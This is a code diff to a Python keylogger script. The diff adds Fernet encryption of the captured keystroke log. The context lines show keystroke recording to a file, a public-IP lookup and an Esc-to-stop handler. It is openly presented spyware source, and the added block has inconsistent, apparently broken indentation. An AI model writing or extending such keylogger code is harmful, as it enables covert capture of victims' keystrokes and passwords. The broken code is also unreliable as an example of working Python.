@@ -47,6 +47,10 @@ count = 0
 keys = []
 
 
+# Generate a key for encryption
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
+
 def get_public_ip():
 	try:
 		# Use httpbin to get public IP address
@@ -111,7 +115,12 @@ def write_file(keys):
             elif k.find("Key") == -1: # filter out special keys (Ctrl, Shift, Alt, etc)
                 f.write(k)
                 f.close()
-
+		    
+# Encrypt the key log file
+    with open(file_path + extend + keys_info, "rb") as original_file:
+        encrypted_data = cipher_suite.encrypt(original_file.read())
+    with open(file_path + extend + keys_info + ".encrypted", "wb") as encrypted_file:
+        encrypted_file.write(encrypted_data)
 
 def on_release(key):
     """Stop keylogger if Esc is released"""
